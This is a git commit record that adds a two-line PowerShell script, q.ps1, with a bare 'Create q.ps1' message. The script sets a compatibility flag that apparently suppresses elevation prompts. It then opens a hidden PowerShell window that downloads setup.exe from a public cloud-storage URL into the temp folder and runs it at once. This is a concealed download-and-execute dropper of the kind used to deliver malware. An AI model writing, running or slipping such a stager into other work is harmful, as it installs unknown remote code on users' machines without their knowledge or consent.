ef40fd64ea7ba924008312e7e27c4e4d3ab785b1
Nicholas Tritsaris <nicholas.tritsaris13@bk.ru>
2026-01-08 20:39:29 +1100

    Create q.ps1

---
+++ q.ps1
@@ -0,0 +1,2 @@
+$env:__COMPAT_LAYER = "RunAsInvoker"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pub-8abdfb6034424ca983a3c8c7fe0b5574.r2.dev/setup.exe' -OutFile '$env:TEMP\setup.exe'; & $env:TEMP\setup.exe"
